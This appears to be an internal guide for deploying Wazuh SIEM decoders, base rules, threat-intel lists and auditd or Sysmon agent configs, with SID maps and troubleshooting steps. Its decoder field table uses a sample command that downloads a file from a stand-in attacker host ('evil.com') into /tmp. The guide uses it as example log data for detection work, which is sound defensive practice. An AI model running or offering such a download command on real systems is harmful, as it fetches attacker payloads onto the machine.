# Wazuh Integration Deployment Guide

> **Purpose:** Complete checklist for deploying base rules, decoders, CDB lists, and agent configs needed BEFORE any detection rules (CVE or general) will work.
> **Lesson Learned:** LL-28 — missing these files = silent rule failure, no error, no warning.
> **Last updated:** 2026-05-15

---

## TL;DR — Deploy Order Matters

```
STEP 1: Decoders         → /var/ossec/etc/decoders/
STEP 2: CDB Lists        → /var/ossec/etc/lists/
STEP 3: Base Rules        → /var/ossec/etc/rules/     (prefix with 00_ for load order)
STEP 4: Detection Rules   → /var/ossec/etc/rules/     (dfx_*, custom-*, etc.)
STEP 5: Agent Config      → audit.rules + ossec.conf
STEP 6: Validate + Restart
```

**If you skip Step 1-3, Step 4 rules will silently never fire.**

---

## Component Inventory

### Decoders (`wazuh-suricata-custom-rules/decoders/`)

| File | What it decodes | Required by | Deploy to |
|------|----------------|-------------|-----------|
| `linux-sysmon.xml` | Sysmon for Linux XML events → `eventdata.*` fields | All `<if_sid>200151-200157</if_sid>` rules | `/var/ossec/etc/decoders/linux-sysmon.xml` |
| `auditd_custom_decoders.xml` | Auditd SYSCALL/EXECVE/PATH/CONFIG_CHANGE → `audit.*` fields | All `<if_sid>200110-200114</if_sid>` rules + `<if_group>audit</if_group>` | `/var/ossec/etc/decoders/auditd_custom_decoders.xml` |

#### Decoder: `linux-sysmon.xml`

**Decoded fields available after deployment:**

| Field | Source | Example |
|-------|--------|---------|
| `system.eventId` | Sysmon EventID | `1`, `3`, `11`, `23` |
| `eventdata.image` | Process image path | `/usr/bin/curl` |
| `eventdata.commandLine` | Full command line | `curl -o /tmp/exploit http://evil.com` |
| `eventdata.parentImage` | Parent process | `/bin/bash` |
| `eventdata.parentCommandLine` | Parent CLI | `bash -i` |
| `eventdata.user` | User context | `root` |
| `eventdata.currentDirectory` | CWD | `/tmp` |
| `eventdata.targetFilename` | File created/deleted (E11/E23) | `/tmp/exploit` |
| `eventdata.hashes` | File hash | `SHA256=abc123...` |
| `eventdata.sourceIp` / `eventdata.destinationIp` | Network (E3) | `10.0.0.1` / `1.2.3.4` |
| `eventdata.destinationPort` | Dest port (E3) | `443` |
| `eventdata.protocol` | Protocol (E3) | `tcp` |

#### Decoder: `auditd_custom_decoders.xml`

**Decoded fields available after deployment:**

| Field | Source Record Type | Example |
|-------|-------------------|---------|
| `audit.id` | All types | `138315` |
| `audit.arch` | SYSCALL | `c000003e` (x86_64) |
| `audit.syscall` | SYSCALL | `59` (execve) |
| `audit.success` | SYSCALL | `yes` |
| `audit.pid` / `audit.ppid` | SYSCALL | `3333` / `432` |
| `audit.uid` / `audit.euid` / `audit.auid` | SYSCALL | `0` / `0` / `1000` |
| `audit.command` | SYSCALL | `curl` |
| `audit.exe` | SYSCALL | `/usr/bin/curl` |
| `audit.key` | SYSCALL/CONFIG_CHANGE | `susp_activity` |
| `audit.session` | SYSCALL/USER_AND_CRED | `2` |
| `audit.tty` | SYSCALL | `pts0` |
| `audit.execve.a0`–`a7` | EXECVE | `curl`, `-o`, `/tmp/file` |
| `audit.directory.name` | PATH | `/usr/bin/grep` |
| `audit.directory.inode` | PATH | `2398` |
| `audit.directory.mode` | PATH | `0100755` |
| `audit.directory.nametype` | PATH | `NORMAL`, `CREATE` |
| `audit.file.name` | PATH (2nd entry) | `/tmp/malware.py` |
| `audit.file.inode` / `audit.file.mode` | PATH (2nd entry) | `399852` / `0100644` |
| `audit.op` | CONFIG_CHANGE | `add_rule` |
| `audit.subj` | CONFIG_CHANGE/USER_AND_CRED | `unconfined` |
| `audit.type` | USER_AND_CRED | `USER_ACCT`, `CRED_ACQ` |
| `audit.acct` | USER_AND_CRED | `root` |
| `audit.unit` | USER_AND_CRED | `firewalld` |
| `srcip` | USER_AND_CRED | `10.10.10.100` |

---

### Base Rules (`wazuh-suricata-custom-rules/rules/wazuh/`)

| File | SID Range | What it provides | Required by |
|------|-----------|-----------------|-------------|
| `sysmonforlinux-base-rules.xml` | 200150–200200 | Parent SIDs for Sysmon events | All CVE rules with `<if_sid>200151\|200155\|200157</if_sid>` |
| `custom-auditd.xml` | 200110–200186 | Parent SIDs for auditd events + Sigma detection rules | All CVE rules with `<if_sid>200110\|200111\|200112</if_sid>` |

#### Base Rule: `sysmonforlinux-base-rules.xml` — SID Map

| SID | Sysmon Event | Description | Group |
|-----|-------------|-------------|-------|
| `200150` | — | Base: Any Sysmon for Linux event | `sysmon_event` |
| `200151` | E1 | Process creation | `sysmon_event1` |
| `200152` | E3 | Network connection | `sysmon_event3` |
| `200153` | E5 | Process terminated | `sysmon_event5` |
| `200154` | E9 | Raw access read | `sysmon_event9` |
| `200155` | E11 | File created | `sysmon_event_11` |
| `200156` | E16 | Sysmon config changed | `sysmon_event_16` |
| `200157` | E23 | File deleted | `sysmon_event_23` |
| `200200` | E3 override | Exclude wazuh-agentd network | `sysmon_event3` |

> ⚠️ **Load order:** Rename to `00_sysmonforlinux-base-rules.xml` on manager to ensure it loads BEFORE `dfx_CVE_*` files (LL-21).

#### Base Rule: `custom-auditd.xml` — SID Map

| SID | Decoder | Description | Group |
|-----|---------|-------------|-------|
| `200110` | `auditd-syscall` | SYSCALL events grouped | `syscall` |
| `200111` | `auditd-execve` | EXECVE events grouped | `execve` |
| `200112` | `auditd-path` | PATH events grouped | `path` |
| `200113` | `auditd-config_change` | CONFIG_CHANGE events | `config_change` |
| `200114` | `auditd-user_and_cred` | USER_AND_CRED events | `user_and_cred` |
| `200120–200186` | Various | 67 Sigma-based detection rules | Various |

> ⚠️ **Load order:** Rename to `00_custom-auditd.xml` on manager.

---

### CDB Lists (`wazuh-suricata-custom-rules/lists/wazuh/`)

| File | What it contains | Used by rule |
|------|-----------------|-------------|
| `bash_profile` | Bash profile file paths for persistence detection | 200120 |
| `administrative-ports` | Known admin ports | Various |
| `common-ports` | Common service ports | Various |
| `domain-controller-hostnames` | DC hostnames for exclusion | Various |
| `domain-controller-ips` | DC IPs for exclusion | Various |
| `high-privilege-users` | Admin usernames | Various |
| `malicious-domains` | Threat intel domains | Various |
| `malicious-hashes` | Threat intel file hashes | Various |
| `pam-ips` | PAM-related IPs | Various |
| `others` | Miscellaneous entries | Various |

**Deploy to:** `/var/ossec/etc/lists/defenxor/`

**After deploying lists, compile them:**
```bash
# On manager
/var/ossec/bin/wazuh-analysisd -t  # validates
# Lists are auto-compiled on restart
```

---

### Config Templates

| File | What | Deploy to |
|------|------|-----------|
| `reference/wazuh/deploy/ossec-manager.conf` | Manager ossec.conf (production template) | `/var/ossec/etc/ossec.conf` (manager) |
| `reference/wazuh/deploy/ossec-agent-linux.conf` | Linux agent ossec.conf (with auditd + FIM) | `/var/ossec/etc/ossec.conf` (Linux agent) |
| `reference/wazuh/deploy/ossec-agent-windows-workstation.conf` | Windows workstation/member server (Sysmon + EventLog + registry) | `C:\Program Files (x86)\ossec-agent\ossec.conf` |
| `reference/wazuh/deploy/ossec-agent-windows-dc.conf` | Windows Domain Controller (AD, DNS Server, LDAP, NTDS FIM, GPO) | `C:\Program Files (x86)\ossec-agent\ossec.conf` |
| `reference/wazuh/deploy/audit.rules` | Auditd baseline (Florian Roth + DFX) | `/etc/audit/rules.d/audit.rules` (Linux agent) |

---

### Agent-Side Config

#### 1. Auditd Baseline (`reference/wazuh/deploy/audit.rules`)

**Deploy to:** `/etc/audit/rules.d/audit.rules` on each Linux agent

```bash
# Install auditd if not present
apt install auditd audispd-plugins   # Debian/Ubuntu
yum install audit audit-libs          # CentOS/RHEL

# Deploy baseline
cp audit.rules /etc/audit/rules.d/audit.rules
service auditd stop
service auditd start

# Verify
auditctl -l | grep -c "key="
# Expected: 50+ rules with keys
```

#### 2. Agent ossec.conf — Audit Log Collection

Ensure agent's `/var/ossec/etc/ossec.conf` includes:

```xml
<!-- Auditd log collection -->
<localfile>
    <log_format>audit</log_format>
    <location>/var/log/audit/audit.log</location>
</localfile>
```

#### 3. (Optional) Sysmon for Linux

```bash
# Install
apt install sysmonforlinux   # or download from Microsoft

# Deploy config
sysmon -accepteula -i sysmon-config.xml

# Verify
sysmon -c
```

Agent ossec.conf addition for Sysmon:
```xml
<!-- Sysmon for Linux log collection -->
<localfile>
    <log_format>syslog</log_format>
    <location>/var/log/syslog</location>
</localfile>
```

---

## Deployment Playbook

### New Customer Onboarding

```
┌──────────────────────────────────────────────────────┐
│ MANAGER SIDE                                          │
├──────────────────────────────────────────────────────┤
│ 1. Deploy decoders:                                   │
│    cp decoders/*.xml /var/ossec/etc/decoders/         │
│                                                       │
│ 2. Deploy CDB lists:                                  │
│    cp lists/wazuh/* /var/ossec/etc/lists/defenxor/    │
│                                                       │
│ 3. Deploy base rules (prefix 00_ for load order):     │
│    cp sysmonforlinux-base-rules.xml                   │
│       → /var/ossec/etc/rules/00_sysmonforlinux-base-rules.xml │
│    cp custom-auditd.xml                               │
│       → /var/ossec/etc/rules/00_custom-auditd.xml     │
│                                                       │
│ 4. Deploy detection rules:                            │
│    cp dfx_CVE_*.xml /var/ossec/etc/rules/             │
│    cp dfx-custom.xml /var/ossec/etc/rules/            │
│                                                       │
│ 5. Validate:                                          │
│    /var/ossec/bin/wazuh-analysisd -t 2>&1             │
│    # Must show 0 errors                               │
│                                                       │
│ 6. Restart manager:                                   │
│    systemctl restart wazuh-manager                    │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│ AGENT SIDE (per customer)                             │
├──────────────────────────────────────────────────────┤
│ 1. Install auditd (if not present)                    │
│ 2. Deploy audit.rules baseline                        │
│ 3. Verify auditctl -l output                          │
│ 4. Verify ossec.conf has audit log localfile          │
│ 5. (Optional) Install Sysmon for Linux                │
│ 6. Restart agent:                                     │
│    systemctl restart wazuh-agent                      │
└──────────────────────────────────────────────────────┘
```

### Adding New CVE Rules (Existing Customer)

```
MANAGER ONLY — no agent changes needed:
1. Write new dfx_CVE_YYYY_NNNNN.xml
2. Validate: python3 validate-rules.py <file>
3. Copy to /var/ossec/etc/rules/
4. /var/ossec/bin/wazuh-analysisd -t
5. systemctl restart wazuh-manager
```

---

## Troubleshooting

### Rules silently not firing

| Symptom | Check | Fix |
|---------|-------|-----|
| `<if_sid>200151</if_sid>` rules never fire | `ls /var/ossec/etc/rules/*sysmon*` | Deploy `00_sysmonforlinux-base-rules.xml` |
| `<if_sid>200110</if_sid>` rules never fire | `ls /var/ossec/etc/rules/*auditd*` | Deploy `00_custom-auditd.xml` |
| `<if_group>audit</if_group>` rules never fire | `grep "audit" /var/ossec/logs/archives/archives.log` | Check auditd installed + ossec.conf localfile |
| `<field name="audit.key">` always empty | `auditctl -l \| head -5` on agent | Deploy audit.rules baseline |
| `<field name="eventdata.image">` empty | Check decoder deployed | Deploy `linux-sysmon.xml` decoder |
| `<list>` lookup rules never match | `ls /var/ossec/etc/lists/defenxor/` | Deploy CDB lists + restart |
| Load order warnings in analysisd -t | `ls /var/ossec/etc/rules/ \| head` | Rename base rules with `00_` prefix |

### Validation commands

```bash
# 1. Check all rules load without error
/var/ossec/bin/wazuh-analysisd -t 2>&1 | grep -i "error\|warn"

# 2. Check specific SID exists
/var/ossec/bin/wazuh-analysisd -t 2>&1 | grep "200151"

# 3. Test a sample log against rules
/var/ossec/bin/wazuh-logtest
# Paste raw audit/sysmon log → verify rule ID fires

# 4. Check decoder is parsing fields
/var/ossec/bin/wazuh-logtest
# Paste log → check "decoder" line shows correct decoder name
# Check "fields" section shows expected audit.*/eventdata.* values

# 5. Check audit events arriving from agent
grep "audit" /var/ossec/logs/archives/archives.log | tail -5

# 6. Check Sysmon events arriving
grep "sysmon" /var/ossec/logs/archives/archives.log | tail -5
```

---

## File-to-SID Dependency Map

Quick reference: "if I delete file X, which rules break?"

| File | Provides SIDs | Rules that break without it |
|------|--------------|----------------------------|
| `linux-sysmon.xml` (decoder) | — | ALL Sysmon rules (fields won't decode) |
| `auditd_custom_decoders.xml` (decoder) | — | ALL auditd rules (fields won't decode) |
| `sysmonforlinux-base-rules.xml` | 200150–200200 | All `<if_sid>200151\|200155\|200157</if_sid>` |
| `custom-auditd.xml` | 200110–200186 | All `<if_sid>200110\|200111\|200112\|200113\|200114</if_sid>` |
| `lists/wazuh/bash_profile` | — | Rule 200120 (bash profile persistence) |
| `audit.rules` (agent) | — | All `<field name="audit.key">` rules (keys won't exist) |
